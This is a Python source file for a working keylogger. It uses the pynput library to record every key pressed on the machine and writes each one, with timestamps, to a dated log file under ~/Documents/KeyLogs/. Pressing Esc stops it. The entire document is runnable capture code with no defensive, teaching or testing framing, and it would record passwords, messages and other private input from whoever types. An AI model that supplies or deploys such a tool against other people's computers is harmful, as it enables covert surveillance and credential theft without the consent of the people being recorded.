import os
from datetime import datetime
from pynput.keyboard import Key, Listener
import logging

# Set up logging directory and file
log_dir = os.path.expanduser("~/Documents/KeyLogs/")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Set up logging file with date and time
log_filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
log_file = os.path.join(log_dir, log_filename)
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

# Log the start of the logging session with a timestamp and date stamp
with open(log_file, 'a') as f:
    f.write(f"\nLogging session started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    f.write("-" * 50 + "\n")

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == Key.esc:
        # Log the end of the logging session with a timestamp and date stamp
        with open(log_file, 'a') as f:
            f.write("-" * 50 + "\n")
            f.write(f"Logging session ended at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        # Stop listener
        return False

# Start listening for key presses
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("Keylogger stopped.")
except Exception as e:
    print(f"Error: {e}")
finally:
    logging.shutdown()
